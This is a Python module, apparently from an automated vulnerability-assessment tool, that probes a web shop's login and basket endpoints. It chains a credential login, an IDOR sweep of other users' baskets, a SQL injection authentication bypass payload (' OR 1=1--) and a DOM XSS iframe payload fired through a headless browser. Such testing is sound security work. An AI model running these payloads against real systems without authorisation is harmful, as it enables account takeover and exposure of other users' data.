"""
Module 4: Vulnerability Assessment

run_auth_check() = Tests normal authentication
run_idor_check() = Tests authenticated access to other basket IDs
run_sqli_check() = Tests SQL injection authentication bypass
run_xss_check() = Tests DOM XSS using Playwright
"""

import base64
import json
import requests

from playwright.sync_api import sync_playwright


TARGET_EMAIL = "test3@test.com"
TARGET_PASSWORD = "12345678"
REQUEST_TIMEOUT = 10


def extract_user_id(token):
    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)

        decoded = base64.urlsafe_b64decode(payload)
        data = json.loads(decoded)

        return data.get("data", {}).get("id")

    except Exception:
        return None


def run_auth_check(state) -> dict:

    print(f"[vuln] Testing authentication on {state['target_url']} ...")

    login_url = f"{state['target_url']}/rest/user/login"

    payload = {
        "email": TARGET_EMAIL,
        "password": TARGET_PASSWORD
    }

    try:

        response = requests.post(
            login_url,
            json=payload,
            timeout=REQUEST_TIMEOUT
        )

        if response.status_code == 200:

            data = response.json()
            authentication = data.get("authentication", {})

            token = authentication.get("token")

            if not token:

                return {
                    "finding_type": "auth",
                    "data": {
                        "login_successful": True,
                        "token_obtained": False,
                        "detail": "Login succeeded but no authentication token was returned."
                    },
                    "chain_trigger": False,
                    "chain_data": None,
                }

            user_id = extract_user_id(token)

            print(f"[vuln] Authenticated UserId: {user_id}")

            return {
                "finding_type": "auth",
                "data": {
                    "login_successful": True,
                    "token_obtained": True,
                    "role": "user",
                    "logged_in_as": TARGET_EMAIL,
                    "user_id": user_id,
                },
                "chain_trigger": True,
                "chain_data": {
                    "next_module": "idor_check",
                    "reason": (
                        "Valid session obtained — test whether "
                        "other users' basket data is accessible"
                    ),
                    "token": token,
                    "user_id": user_id,
                },
            }

        return {
            "finding_type": "auth",
            "data": {
                "login_successful": False,
                "status_code": response.status_code,
            },
            "chain_trigger": False,
            "chain_data": None,
        }

    except requests.RequestException as e:

        return {
            "finding_type": "auth",
            "data": {
                "login_successful": False,
                "error": str(e),
            },
            "chain_trigger": False,
            "chain_data": None,
        }


def run_idor_check(state) -> dict:

    pending_chain = state.get("pending_chain")

    token = pending_chain.get("token") if pending_chain else None
    user_id = pending_chain.get("user_id") if pending_chain else None

    print(
        f"[vuln] Chained IDOR check "
        f"(authenticated UserId: {user_id}) ..."
    )

    if not token:

        return {
            "finding_type": "idor",
            "data": {
                "vulnerable": False,
                "reason": "No authentication token available."
            },
            "chain_trigger": False,
            "chain_data": None,
        }

    if user_id is None:

        return {
            "finding_type": "idor",
            "data": {
                "vulnerable": False,
                "reason": "Could not determine authenticated UserId."
            },
            "chain_trigger": False,
            "chain_data": None,
        }

    headers = {
        "Authorization": f"Bearer {token}"
    }

    unauthorized_baskets = []
    checked_baskets = []

    for basket_id in range(1, 8):

        url = f"{state['target_url']}/rest/basket/{basket_id}"

        try:

            response = requests.get(
                url,
                headers=headers,
                timeout=REQUEST_TIMEOUT
            )

            try:
                response_data = response.json()
            except ValueError:
                response_data = {}

            if response.status_code != 200:

                checked_baskets.append({
                    "basket_id": basket_id,
                    "status": response.status_code,
                    "owner_user_id": None
                })

                continue

            basket_data = response_data.get("data")

            if not basket_data:

                checked_baskets.append({
                    "basket_id": basket_id,
                    "status": response.status_code,
                    "owner_user_id": None
                })

                continue

            owner_user_id = basket_data.get("UserId")

            checked_baskets.append({
                "basket_id": basket_id,
                "status": response.status_code,
                "owner_user_id": owner_user_id
            })

            if (
                owner_user_id is not None
                and owner_user_id != user_id
            ):

                unauthorized_baskets.append({
                    "basket_id": basket_id,
                    "owner_user_id": owner_user_id
                })

        except requests.RequestException as e:

            checked_baskets.append({
                "basket_id": basket_id,
                "status": "error",
                "owner_user_id": None,
                "error": str(e)
            })

    vulnerable = len(unauthorized_baskets) > 0

    unauthorized_ids = [
        item["basket_id"]
        for item in unauthorized_baskets
    ]

    if vulnerable:

        detail = (
            f"Authenticated UserId {user_id} accessed baskets "
            f"belonging to other users: {unauthorized_ids}"
        )

    else:

        detail = (
            f"No unauthorized basket access confirmed "
            f"for UserId {user_id}."
        )

    print(f"[vuln] IDOR vulnerable: {vulnerable}")

    if vulnerable:
        print(
            f"[vuln] Unauthorized baskets: {unauthorized_ids}"
        )

    return {
        "finding_type": "idor",
        "data": {
            "vulnerable": vulnerable,
            "authenticated_user_id": user_id,
            "unauthorized_basket_ids": unauthorized_ids,
            "unauthorized_baskets": unauthorized_baskets,
            "checked_baskets": checked_baskets,
            "tested_range": "1-7",
            "detail": detail,
        },
        "chain_trigger": False,
        "chain_data": None,
    }


def run_sqli_check(state) -> dict:

    print(f"[vuln] Testing SQL injection on {state['target_url']} ...")

    login_url = f"{state['target_url']}/rest/user/login"

    payload = {
        "email": "' OR 1=1--",
        "password": "irrelevant",
    }

    try:

        response = requests.post(
            login_url,
            json=payload,
            timeout=REQUEST_TIMEOUT
        )

        if response.status_code != 200:

            return {
                "finding_type": "sqli",
                "data": {
                    "vulnerable": False,
                    "status_code": response.status_code,
                    "detail": (
                        f"Login endpoint rejected SQLi payload "
                        f"(status {response.status_code})"
                    ),
                },
                "chain_trigger": False,
                "chain_data": None,
            }

        data = response.json()

        authentication = data.get("authentication", {})

        token = authentication.get("token")

        user_id = extract_user_id(token) if token else None

        result = {
            "finding_type": "sqli",
            "data": {
                "vulnerable": True,
                "detail": (
                    "Authentication bypass succeeded using SQLi payload "
                    "on login endpoint — logged in without valid credentials"
                ),
                "bypass_token_obtained": bool(token),
            },
            "chain_trigger": False,
            "chain_data": None,
        }

        if token:

            result["chain_trigger"] = True

            result["chain_data"] = {
                "next_module": "idor_check",
                "reason": (
                    "SQL injection produced an authenticated session — "
                    "test whether the session can access other users' data"
                ),
                "token": token,
                "user_id": user_id,
            }

        return result

    except (requests.RequestException, ValueError) as e:

        return {
            "finding_type": "sqli",
            "data": {
                "vulnerable": False,
                "error": str(e),
            },
            "chain_trigger": False,
            "chain_data": None,
        }


def run_xss_check(state) -> dict:

    print(f"[vuln] Testing XSS on {state['target_url']} ...")

    target_url = state["target_url"]

    payload = '<iframe src="javascript:alert(`xss`)">'

    try:

        with sync_playwright() as p:

            browser = p.chromium.launch(headless=True)

            page = browser.new_page()

            triggered = False

            def handle_dialog(dialog):

                nonlocal triggered

                triggered = True

                dialog.dismiss()

            page.on("dialog", handle_dialog)

            page.goto(
                target_url,
                wait_until="networkidle",
                timeout=30000
            )

            search = page.locator(
                "input[type='text']"
            ).first

            if not search.is_visible():

                browser.close()

                return {
                    "finding_type": "xss",
                    "data": {
                        "vulnerable": False,
                        "tested_endpoint": target_url,
                        "detail": "Search input was not found.",
                    },
                    "chain_trigger": False,
                    "chain_data": None,
                }

            search.fill(payload)

            search.press("Enter")

            page.wait_for_timeout(1500)

            browser.close()

            return {
                "finding_type": "xss",
                "data": {
                    "vulnerable": triggered,
                    "tested_endpoint": target_url,
                    "payload": payload,
                    "detail": (
                        "DOM XSS payload executed successfully."
                        if triggered
                        else "XSS payload did not execute."
                    ),
                },
                "chain_trigger": False,
                "chain_data": None,
            }

    except Exception as e:

        return {
            "finding_type": "xss",
            "data": {
                "vulnerable": False,
                "error": str(e),
            },
            "chain_trigger": False,
            "chain_data": None,
        }